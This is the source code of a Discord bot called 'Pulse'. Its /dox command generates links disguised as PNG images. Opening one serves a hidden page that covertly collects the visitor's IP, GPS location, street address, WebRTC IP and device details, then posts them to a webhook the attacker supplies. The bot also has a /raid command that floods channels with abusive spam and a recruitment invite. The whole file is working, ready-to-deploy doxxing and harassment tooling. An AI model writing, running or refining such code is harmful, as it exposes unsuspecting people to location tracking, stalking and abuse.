const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

// ---- ENVIRONMENT VARIABLES ----
const TOKEN = process.env.TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/AjUx96vJH';
const OWNER_ID = process.env.OWNER_ID;
const PORT = process.env.PORT || 3000;

// ---- MINIMAL INTENTS ----
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ],
});

// ---- STORE ACTIVE LINKS ----
const links = new Map();

// ---- EXPRESS SERVER ----
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    console.log(`🔍 Requested ID: ${id}`);
    console.log(`📦 Current links:`, Array.from(links.keys()));
    
    if (!links.has(id)) {
        console.log(`❌ ID not found: ${id}`);
        res.type('image/png');
        return res.send('Image not found');
    }
    
    console.log(`✅ ID found: ${id}`);
    const linkData = links.get(id);
    const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
    res.type('text/html');
    res.send(generateDoxHTML(targetWebhook));
});

app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
});

// ---- DISCORD BOT ----
client.once('ready', async () => {
    console.log(`🤖 Logged in as ${client.user.tag}`);
    
    try {
        await client.application.commands.set([]);
        console.log('✅ Cleared all global commands');
        
        const guilds = await client.guilds.fetch();
        for (const [id, guild] of guilds) {
            try {
                await guild.commands.set([]);
                console.log(`✅ Cleared commands in guild: ${guild.name}`);
            } catch (err) {
                console.log(`❌ Could not clear commands in guild: ${guild.name}`);
            }
        }
        
        await client.application.commands.set([
            { 
                name: 'dox', 
                description: 'Generate a fresh dox link',
                options: [
                    {
                        name: 'webhook',
                        description: 'Discord webhook URL to send data to',
                        type: 3,
                        required: true
                    }
                ]
            },
            { 
                name: 'raid', 
                description: 'Flood the channel with a raid message',
                options: [
                    {
                        name: 'count',
                        description: 'Number of spam lines (1-35)',
                        type: 4,
                        required: false
                    }
                ]
            },
            { 
                name: 'invite', 
                description: 'Get an invite link for Pulse' 
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('❌ Failed to register commands:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });

        const customWebhook = interaction.options.getString('webhook');
        if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
        }
        
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;

        links.set(id, {
            created: Date.now(),
            user: interaction.user.tag,
            webhook: customWebhook
        });

        console.log(`✅ Generated link: ${url}`);
        console.log(`📦 Webhook: ${customWebhook}`);

        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
            .addFields(
                { name: '📍 What gets logged', value: '• Exact coordinates (GPS if allowed)\n• Street address (if GPS allowed)\n• IP, ISP, ASN\n• Browser, OS, GPU, Screen\n• Battery, Connection type\n• VPN/Proxy detection', inline: false }
            )
            .setFooter({ text: 'Expires after 100 links generated' });

        await interaction.editReply({ embeds: [embed] });
    }

    // ---- RAID ----
    if (interaction.commandName === 'raid') {
        await interaction.deferReply({ ephemeral: true });

        const channel = interaction.channel;
        if (!channel) {
            return interaction.editReply('❌ Could not find the channel. Make sure the bot is in this server.');
        }

        const count = Math.min(interaction.options.getInteger('count') || 20, 35);
        if (count < 1) {
            return interaction.editReply('❌ Count must be at least 1.');
        }

        try {
            const lines = [];
            for (let i = 0; i < count; i++) {
                lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
            }
            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
            
            const bigMessage = lines.join('\n');

            if (bigMessage.length > 2000) {
                const chunks = bigMessage.match(/[\s\S]{1,1990}/g) || [];
                for (const chunk of chunks) {
                    await channel.send(chunk);
                }
            } else {
                await channel.send(bigMessage);
            }
            
            try {
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('raid_again')
                            .setLabel('🔁 Send Again')
                            .setStyle(ButtonStyle.Primary)
                    );

                await interaction.editReply({ 
                    content: `✅ Raid sent (${count} lines). Click the button to send again.`,
                    components: [row]
                });
            } catch (err) {
                console.log('Interaction expired — can\'t edit reply.');
            }
        } catch (error) {
            console.error('Raid failed:', error);
            try {
                await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
            } catch (err) {
                console.log('Interaction expired — can\'t send error reply.');
            }
        }
    }

    // ---- INVITE (owner only) ----
    if (interaction.commandName === 'invite') {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ 
                content: '❌ You do not have permission to use this command.', 
                ephemeral: true 
            });
        }
        
        const embed = new EmbedBuilder()
            .setTitle('📩 Invite Pulse')
            .setColor(0x8B5CF6)
            .setDescription(`[➕ Add Bot to Your Server](https://discord.com/oauth2/authorize?client_id=1545939378361081916)`)
            .setFooter({ text: 'Click the link above to invite' });

        await interaction.reply({ embeds: [embed] });
    }
});

// ---- BUTTON HANDLER ----
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId === 'raid_again') {
        await interaction.deferReply({ ephemeral: true });

        const channel = interaction.channel;
        if (!channel) {
            return interaction.editReply('❌ This command can only be used in a server channel.');
        }

        try {
            const count = 20;
            const lines = [];
            for (let i = 0; i < count; i++) {
                lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
            }
            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
            
            const bigMessage = lines.join('\n');

            if (bigMessage.length > 2000) {
                const chunks = bigMessage.match(/[\s\S]{1,1990}/g) || [];
                for (const chunk of chunks) {
                    await channel.send(chunk);
                }
            } else {
                await channel.send(bigMessage);
            }
            
            try {
                await interaction.editReply('✅ Raid sent again.');
            } catch (err) {
                console.log('Button interaction expired.');
            }
        } catch (error) {
            console.error('Raid button failed:', error);
            try {
                await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
            } catch (err) {
                console.log('Button interaction expired.');
            }
        }
    }
});

// ---- CLEANUP ----
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) {
        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
    }
}, 60000);

// ---- DOX HTML (with geocoding) ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
    const WEBHOOK_URL = "${webhook}";

    // ---- REVERSE GEOCODING ----
    async function reverseGeocode(lat, lon) {
        try {
            const res = await fetch(\`https://nominatim.openstreetmap.org/reverse?lat=\${lat}&lon=\${lon}&format=json&zoom=18&addressdetails=1\`);
            const data = await res.json();
            if (data && data.display_name) {
                return data.display_name;
            }
            return null;
        } catch {
            return null;
        }
    }

    // ---- GET IP DATA ----
    async function getIPData() {
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                    asn: data.asn || 'N/A',
                    isp: data.org || 'N/A',
                    org: data.org || 'N/A'
                };
            }
        } catch (e) {}
        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', org: 'N/A' };
    }

    // ---- MAIN ----
    (async function() {
        try {
            const ipData = await getIPData();
            const ip = ipData.ip || 'N/A';
            const country = ipData.country || 'N/A';
            const region = ipData.region || 'N/A';
            const city = ipData.city || 'N/A';
            const postal = ipData.postal || 'N/A';
            const lat = ipData.lat || 'N/A';
            const lon = ipData.lon || 'N/A';
            const asn = ipData.asn || 'N/A';
            const isp = ipData.isp || 'N/A';

            // ---- TRY GPS + REVERSE GEOCODE ----
            let address = 'N/A';
            let gpsLat = 'N/A';
            let gpsLon = 'N/A';
            let gpsAccuracy = 'N/A';

            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                    });
                    gpsLat = pos.coords.latitude;
                    gpsLon = pos.coords.longitude;
                    gpsAccuracy = Math.round(pos.coords.accuracy) + 'm';
                    
                    // Reverse geocode the GPS coordinates
                    const addr = await reverseGeocode(gpsLat, gpsLon);
                    if (addr) address = addr;
                } catch (e) {
                    console.log('GPS denied or failed');
                }
            }

            // If GPS failed, use IP geolocation
            if (address === 'N/A') {
                const parts = [city, region, postal, country].filter(p => p && p !== 'N/A');
                address = parts.length > 0 ? parts.join(', ') : 'N/A';
            }

            // ---- DEVICE DATA ----
            const deviceData = {
                timestamp: new Date().toISOString(),
                ip: ip,
                country: country,
                region: region,
                city: city,
                postal: postal,
                address: address,
                gpsLat: gpsLat,
                gpsLon: gpsLon,
                gpsAccuracy: gpsAccuracy,
                lat: gpsLat !== 'N/A' ? gpsLat : lat,
                lon: gpsLon !== 'N/A' ? gpsLon : lon,
                asn: asn,
                isp: isp,
                screen: screen.width + 'x' + screen.height,
                browser: getBrowser(navigator.userAgent),
                os: getOS(navigator.userAgent),
                device: getDeviceType(navigator.userAgent),
                battery: await getBatteryInfo(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gpu: getGPUInfo(),
                userAgent: navigator.userAgent,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink || 'N/A',
                    rtt: navigator.connection.rtt || 'N/A'
                } : null,
                incognito: isIncognito(),
                adBlocker: await detectAdBlocker(),
                webRTC: await getWebRTCIP(),
                language: navigator.language,
                platform: navigator.platform
            };

            // ---- SEND TO WEBHOOK ----
            const mapUrl = \`https://www.google.com/maps?q=\${deviceData.lat},\${deviceData.lon}\`;
            const locationSource = gpsLat !== 'N/A' ? '🎯 GPS (exact)' : '📍 IP Geolocation (approx)';

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "☠️ Full Dox",
                        color: 0xFF0000,
                        fields: [
                            { name: "📍 Address", value: deviceData.address || 'N/A', inline: false },
                            { name: "📌 Coordinates", value: \`\${deviceData.lat}, \${deviceData.lon}\`, inline: true },
                            { name: "🎯 Accuracy", value: deviceData.gpsAccuracy || 'N/A', inline: true },
                            { name: "📍 Source", value: locationSource, inline: true },
                            { name: "🌐 IP", value: deviceData.ip || 'N/A', inline: true },
                            { name: "🏙️ City", value: deviceData.city || 'N/A', inline: true },
                            { name: "🗺️ Region", value: deviceData.region || 'N/A', inline: true },
                            { name: "📮 Postal", value: deviceData.postal || 'N/A', inline: true },
                            { name: "🔢 ASN", value: deviceData.asn || 'N/A', inline: true },
                            { name: "🏢 ISP", value: deviceData.isp || 'N/A', inline: true },
                            { name: "📱 Screen", value: deviceData.screen || 'N/A', inline: true },
                            { name: "🧠 Browser", value: deviceData.browser || 'N/A', inline: true },
                            { name: "💻 OS", value: deviceData.os || 'N/A', inline: true },
                            { name: "🖥️ Device", value: deviceData.device || 'N/A', inline: true },
                            { name: "🔋 Battery", value: deviceData.battery || 'N/A', inline: true },
                            { name: "📶 Connection", value: deviceData.connection ? \`\${deviceData.connection.type} (\${deviceData.connection.downlink} Mbps)\` : 'N/A', inline: true },
                            { name: "🕒 Timezone", value: deviceData.timezone || 'N/A', inline: true },
                            { name: "🌐 Language", value: deviceData.language || 'N/A', inline: true },
                            { name: "🔒 Incognito", value: deviceData.incognito ? '✅ Likely' : '❌ No', inline: true },
                            { name: "🧩 Ad Blocker", value: deviceData.adBlocker ? '✅ Yes' : '❌ No', inline: true },
                            { name: "📡 WebRTC", value: deviceData.webRTC || 'N/A', inline: true },
                            { name: "🎮 GPU", value: deviceData.gpu || 'N/A', inline: false },
                            { name: "🗺️ Map", value: \`[Click to view](\${mapUrl})\`, inline: false },
                            { name: "🌐 User Agent", value: deviceData.userAgent || 'N/A', inline: false }
                        ],
                        footer: { text: "Logged at " + deviceData.timestamp }
                    }]
                })
            }).catch(() => {});

        } catch (err) {}
        document.body.innerHTML = '';
        document.body.style.background = '#ffffff';
        document.body.style.margin = '0';
        document.body.style.height = '100vh';
        setTimeout(() => { window.close(); window.location.href = 'about:blank'; }, 1500);
    })();

    // ---- HELPERS ----
    async function getIPData() {
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                    asn: data.asn || 'N/A',
                    isp: data.org || 'N/A',
                    org: data.org || 'N/A'
                };
            }
        } catch (e) {}
        try {
            const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
            const fallbackData = await fallbackRes.json();
            if (fallbackData.status === 'success') {
                return {
                    ip: fallbackData.query || 'N/A',
                    country: fallbackData.country || 'N/A',
                    region: fallbackData.regionName || 'N/A',
                    city: fallbackData.city || 'N/A',
                    postal: fallbackData.zip || 'N/A',
                    lat: fallbackData.lat || 'N/A',
                    lon: fallbackData.lon || 'N/A',
                    asn: fallbackData.as || 'N/A',
                    isp: fallbackData.isp || 'N/A',
                    org: fallbackData.isp || 'N/A'
                };
            }
        } catch (e) {}
        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', org: 'N/A' };
    }

    async function getBatteryInfo() {
        try {
            const battery = await navigator.getBattery();
            return Math.round(battery.level * 100) + '%' + (battery.charging ? ' (Charging)' : '');
        } catch { return 'N/A'; }
    }

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'N/A';
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debug) return 'N/A';
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch { return 'N/A'; }
    }

    function getDeviceType(ua) {
        if (/mobile|android|iphone|ipad/i.test(ua)) return '📱 Mobile';
        if (/tablet|ipad/i.test(ua)) return '📱 Tablet';
        return '💻 Desktop';
    }

    function getBrowser(ua) {
        if (ua.includes('Edg')) return 'Edge';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        return 'Unknown';
    }

    function getOS(ua) {
        if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
        if (ua.includes('Mac OS X')) return 'macOS';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('iPhone')) return 'iOS';
        return 'Unknown';
    }

    function isIncognito() {
        return !!(navigator.webdriver || navigator.plugins.length === 0);
    }

    function detectAdBlocker() {
        return new Promise((resolve) => {
            const test = document.createElement('div');
            test.className = 'ad-detection';
            test.style.cssText = 'display:block;height:1px;position:absolute;top:-999px;';
            document.body.appendChild(test);
            setTimeout(() => {
                const detected = window.getComputedStyle(test).display === 'none';
                test.remove();
                resolve(detected);
            }, 100);
        });
    }

    function getWebRTCIP() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (e) => {
                if (!e.candidate) return;
                const ip = e.candidate.address || e.candidate.ip || 'N/A';
                if (ip && !ip.includes('local')) {
                    resolve(ip);
                    pc.close();
                }
            };
            setTimeout(() => { resolve('N/A'); pc.close(); }, 2000);
        });
    }
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
